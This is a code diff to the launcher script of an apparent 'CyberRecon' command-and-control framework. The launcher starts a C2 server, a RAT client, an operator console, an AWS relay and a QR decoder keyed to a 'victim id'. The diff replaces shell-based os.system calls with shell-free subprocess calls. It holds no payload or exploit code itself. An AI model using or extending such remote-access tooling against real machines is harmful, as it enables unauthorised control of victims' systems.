@@ -4,51 +4,56 @@ Start C2 Server, QR Decoder, or Operator CLI from one entry point.
 """
 
 import argparse
+import subprocess
 import sys
-import os
+
+
+def _run(argv: list) -> None:
+    """Run a subprocess safely without a shell (CWE-78 mitigation)."""
+    try:
+        subprocess.run([sys.executable, *argv], shell=False, check=False)
+    except FileNotFoundError as e:
+        print(f"[!] Command not found: {e}")
 
 
 def start_c2():
     """Start the C2 Server."""
     print("[*] Starting CyberRecon C2 Server...")
-    os.system("python c2_server.py")
+    _run(["c2_server.py"])
 
 
 def start_decoder(victim_id, c2_url):
     """Start the QR Decoder client (unified into rat_client.py)."""
     print(f"[*] Starting QR Decoder for victim: {victim_id}")
-    os.system(f"python rat_client.py --c2 {c2_url} --victim-id {victim_id} --interval 5")
+    _run(["rat_client.py", "--c2", c2_url, "--victim-id", victim_id, "--interval", "5"])
 
 
 def start_operator(c2_url):
     """Start the Operator CLI."""
     print("[*] Starting Operator CLI...")
-    os.system(f"python operator_cli.py --c2 {c2_url}")
+    _run(["operator_cli.py", "--c2", c2_url])
 
 
 def start_rat(c2_host, c2_port):
     """Start the RAT client."""
     print("[*] Starting CyberRecon RAT Client...")
-    os.system(f"python rat_client.py --c2 {c2_host} --c2-port {c2_port}")
+    _run(["rat_client.py", "--c2", c2_host, "--c2-port", str(c2_port)])
 
 
 def start_aws_relay(c2_backend):
     """Start AWS Relay Server."""
     print("[*] Starting AWS Relay Server...")
-    os.system(f"python aws_relay.py --c2 {c2_backend}")
-
-
- 
+    _run(["aws_relay.py", "--c2", c2_backend])
 
 
 def run_tests():
     """Run integration tests."""
     print("[*] Running integration tests...")
-    os.system("python tests/test_demo.py")
-
+    _run(["tests/test_demo.py"])
 
 def print_banner():
     print(r"""
+   ____      _                  ____                      
   / ___|   _| |__   ___ _ __   |  _ \ ___  ___ ___  _ __  
  | |  | | | | '_ \ / _ \ '__|  | |_) / _ \/ __/ _ \| '_ \ 
  | |__| |_| | |_) |  __/ |     |  _ <  __/ (_| (_) | | | |
@@ -88,7 +93,7 @@ Examples:
                         help="C2 server port")
     parser.add_argument("--victim-id",
                         help="Victim ID for decoder mode")
-   
+
 
     args = parser.parse_args()
 
@@ -107,7 +112,7 @@ Examples:
         start_rat(args.c2_host, args.c2_port)
     elif args.mode == "relay":
         start_aws_relay(args.c2_url)
-    
+
     elif args.mode == "test":
         run_tests()
 
